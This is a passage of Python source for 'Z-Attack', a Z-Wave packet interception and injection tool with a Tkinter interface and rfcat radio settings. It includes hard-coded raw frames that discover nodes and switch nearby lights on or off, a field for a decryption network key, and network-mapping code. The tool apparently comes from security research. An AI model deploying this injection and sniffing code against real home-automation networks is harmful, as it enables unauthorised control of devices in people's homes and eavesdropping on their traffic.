    listBoxSelectCC.bind('<ButtonRelease-1>', window_send_advanced_select_cc)
    scrollbCC = Scrollbar(bottomFrame, command=listBoxSelectCC.yview)
    scrollbCC.grid(row=1, column=7, padx=0, pady=2, sticky='nsew')
    listBoxSelectCC['yscrollcommand'] = scrollbCC.set

    for id in zwave_dic.keys():
        listBoxSelectHomeID.insert(END, id)
    for CC in sorted(sendData.CmdClassToSend):  # CC
        listBoxSelectCC.insert(END, CC)


def scan_zwave_network():
    # MANUFACTURER_GET
    sending_raw_mode("\x01\x41\x01\x0e\xff\x72\x04\x00\x86")


def window_send_easy():
    w_sendEasy = Toplevel()
    w_sendEasy.wm_title("Z-Attack - Send Z-Wave frame (Easy mode)")
    w_sendEasy.resizable(width=FALSE, height=FALSE)
    frame_WindowSendEasy = Frame(w_sendEasy, width=200, height=600)
    frame_WindowSendEasy.grid(row=0, column=1, padx=10, pady=2)

    if listboxMainHomeID.size() == 1:
        i = (0,)
    else:
        i = listboxMainHomeID.curselection()

    if i:
        #frameWindowSendEasy = Frame(w_sendEasy, width=200, height=600)
        #frameWindowSendEasy.grid(row=0, column=1, padx=10, pady=2)

        buttonDiscovery = Button(frame_WindowSendEasy, text="Network Discovery (Find Nodes and Manufacturer)", command=lambda: scan_zwave_network())
        buttonDiscovery.grid(row=1, column=1, padx=20, pady=2)

        buttonTurnOnLight = Button(frame_WindowSendEasy, text="Turn On Lights", command=lambda: sending_raw_mode("\x01\x41\x01\x0e\xff\x25\x01\xff\x4c"))
        buttonTurnOnLight.grid(row=2, column=1, padx=20, pady=2)

        buttonTurnOffLight = Button(frame_WindowSendEasy, text="Turn Off Lights", command=lambda: sending_raw_mode("\x01\x41\x01\x0e\xff\x25\x01\x00\x4c"))
        buttonTurnOffLight.grid(row=3, column=1, padx=20, pady=2)
    else:
        Label(frame_WindowSendEasy, text="Please select a HomeID first").grid(row=1, column=0, padx=10, pady=2)


def define_key():
    global key
    print "[NETWORK KEY CHANGED] (hex):" + Nkey_userInput.get()
    key = Nkey_userInput.get()


def window_key():
    global key, Nkey_userInput
    w_key = Toplevel()
    w_key.wm_title("Z-Attack - AES Encryption")
    rightbottomFrame = Frame(w_key, width=200, height=600)
    rightbottomFrame.grid(row=0, column=0, padx=10, pady=2)

    Label(rightbottomFrame, text="Define Network Key to decrypt (default OZW):").grid(row=0, column=0, padx=10, pady=2)
    Nkey_userInput = Entry(rightbottomFrame, width=34, textvariable=key)
    Nkey_userInput.delete(0, END)
    Nkey_userInput.insert(0, key)
    Nkey_userInput.grid(row=1, column=0, padx=10, pady=2)

    buttonDefine = Button(rightbottomFrame, text="Define", command=define_key)
    buttonDefine.grid(row=1, column=1, padx=20, pady=2)


def window_discovery():
    global frame
    w_discovery = Toplevel()
    w_discovery.wm_title("Z-Attack - Discovery")
    frm_scan = Frame(w_discovery, width=200, height=600)
    frm_scan.grid(row=0, column=1, padx=2, pady=2)

    if listboxMainHomeID.size() == 1:
        i = (0,)
    else:
        i = listboxMainHomeID.curselection()

    # Graph generator
    for homeID in zwave_dic:
        graph = pydot.Dot(graph_type='digraph')
        node_controler = ""
        for j in range(len(zwave_dic[homeID])):
            nodes = zwave_dic[homeID][j]
            if str(nodes[0]) == "01":
                node_controler = pydot.Node("HomeID " + homeID + ('' if not nodes[1] else " - " + str(nodes[1])),
                                            style="filled",
                                            fillcolor="red")
                graph.add_node(node_controler)
        if node_controler:
            for j in range(len(zwave_dic[homeID])):
                nodes = zwave_dic[homeID][j]
                if str(nodes[0]) != "01":
                    node_x = pydot.Node("NodeID " + str(nodes[0]) + ('' if not nodes[1] else " - " + str(nodes[1])),
                                        style="filled",
                                        fillcolor="green")
                    graph.add_node(node_x)
                    graph.add_edge(pydot.Edge(node_controler, node_x))
        graph.write_png("discovery/" + homeID + "_graph.png")

    if i:
        img = ImageTk.PhotoImage(Image.open("discovery/" + listboxMainHomeID.get(i) + "_graph.png"))
        panel2 = Label(frm_scan, image=img)
        panel2.image = img  # Workaround to counter garbage collection
        panel2.grid(row=3, column=1, padx=2, pady=2)
        panel2.pack(side="bottom", fill="both", expand="yes")
    else:
        Label(frm_scan, text="Please select a HomeID first").grid(row=1, column=0, padx=10, pady=2)


# TK GUI
root = Tk()
root.wm_title("Z-Attack - Z-Wave Packet Interception and Injection Tool")
root.resizable(width=True, height=True)

leftFrame = Frame(root, width=200, height=600)
leftFrame.grid(row=0, column=0, padx=0, pady=0)

log = Text(leftFrame, width=150, height=30, takefocus=0, fg="green", bg="black")
log.grid(row=0, column=0, padx=2, pady=2)
scrollb = Scrollbar(leftFrame, command=log.yview)
scrollb.grid(row=0, column=1, padx=0, pady=2, sticky='nsew')
log['yscrollcommand'] = scrollb.set

rightFrame = Frame(root, width=200, height=600)
rightFrame.rowconfigure(2, weight=1)  # Make the listbox span across the whole row
rightFrame.grid(row=0, column=1, padx=0, pady=0, sticky='nsew')
Label(rightFrame, text="Z-Wave Network Information:").grid(row=0, column=0, padx=10, pady=2)

homeid_found = StringVar()
Label(rightFrame, text="HomeID around you:").grid(row=1, column=0, padx=10, pady=2)

listboxMainHomeID = Listbox(rightFrame, selectmode=SINGLE)
listboxMainHomeID.grid(row=2, column=0, padx=2, pady=2, sticky='nsew')
scrollb2 = Scrollbar(rightFrame, command=listboxMainHomeID.yview)
scrollb2.grid(row=2, column=1, padx=0, pady=2, sticky='nsew')
listboxMainHomeID['yscrollcommand'] = scrollb2.set

mainmenu = Menu(root)
menuFile = Menu(mainmenu)
menuFile.add_command(label="Send Frame (advanced mode)", command=window_send_advanced)
menuFile.add_command(label="Send Frame (easy mode)", command=window_send_easy)
menuFile.add_command(label="Define AES key", command=window_key)
menuFile.add_command(label="Network Map", command=window_discovery)
menuFile.add_command(label="Quit", command=root.quit)

menuHelp = Menu(mainmenu)
menuHelp.add_command(label="About", command=window_about)

mainmenu.add_cascade(label="Menu", menu=menuFile)
mainmenu.add_cascade(label="Help", menu=menuHelp)

root.config(menu=mainmenu)


def help():
    print "Z-Attack " + version
    print "-d [DEBUG]"
    print "-csv [CSV output]"
    print "-1 [Rfcat] [DEFAULT]"
    print "-2 [TI RF KIT]"
    print "-lcom COM1 [LISTENING PORT] [TI RF KIT]"
    print "-scom COM2 [SENDING PORT] [TI RF KIT]"
    print "Author : Advens"
    exit(0)


def license():
    print "Z-Attack - Copyright (C) 2015 Advens"
    print ""
    print "This program comes with ABSOLUTELY NO WARRANTY;"
    print "This is free software, and you are welcome to redistribute it under certain conditions;"


def main():
    global d, debug, fOutput, serialListen, deviceData, scom
    fOutput = 0

    lcom = scom = ""
    deviceData = 1  # Default Rfcat

    argc = len(argv)
    for i in range(argc):
        s = argv[i]
        if i < argc:
            if s in ("-d"):
                debug = 1
            if s in ("-csv"):
                fOutput = 1
            if s in ("-h"):
                help()
                exit(0)
            if s in ("-1"):
                deviceData = 1
            if s in ("-2"):
                deviceData = 2
            if s in ("-lcom"):
                lcom = argv[i+1]
            if s in ("-scom"):
                scom = argv[i+1]

    if deviceData == 2:
        if lcom and scom:
            try:
                serialListen = Serial(port=lcom,
                                      baudrate=115000,
                                      bytesize=EIGHTBITS,
                                      parity=PARITY_NONE,
                                      stopbits=STOPBITS_ONE,
                                      timeout=0)
            except:
                print "Error with " + lcom
                exit(0)
        else:
            print "With -2 option, 'lcom' and 'scom' must be set"
            exit(0)
    else:
        d = rfcat(0, debug=False)

        # Thanks to killerzee
        d.setFreq(868399841)
        d.setMdmModulation(MOD_2FSK)
        d.setMdmSyncWord(0xaa0f)
        d.setMdmDeviatn(20629.883)
        d.setMdmChanSpc(199951.172)
        d.setMdmChanBW(101562.5)
        d.setMdmDRate(39970.4)
        d.makePktFLEN(48)
        d.setEnableMdmManchester(False)
        d.setMdmSyncMode(SYNCM_CARRIER_15_of_16)

    license()
    root.after(100, listening_mode)
    root.mainloop()


if __name__ == "__main__":
    main()
